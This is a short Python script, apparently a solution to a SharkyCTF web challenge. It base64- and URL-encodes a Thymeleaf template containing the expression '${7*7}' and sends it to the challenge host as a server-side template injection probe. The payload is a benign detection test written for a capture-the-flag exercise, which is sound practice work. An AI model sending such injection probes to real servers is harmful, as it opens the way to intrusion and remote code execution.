import requests
import urllib
import base64


template =  b'''<div> <table border="1"> <tr> <th>Name</th> <th>Discovery year</th> <th>Discoverer name</th> </tr> <tr th:each ="fish : ${fishes}"> <td th:utext="${fish.name}">...</td> <td th:utext="${7*7}">...</td> <td th:utext="${fish.discovererName}">...</td> </tr> </table> </div>      '''

query = base64.b64encode(template).decode('utf-8')

query = urllib.parse.quote(query)

print(query)

host = 'http://webfugu.sharkyctf.xyz/process'

req = requests.get(host + '?page={}'.format(query))

print(req.text)



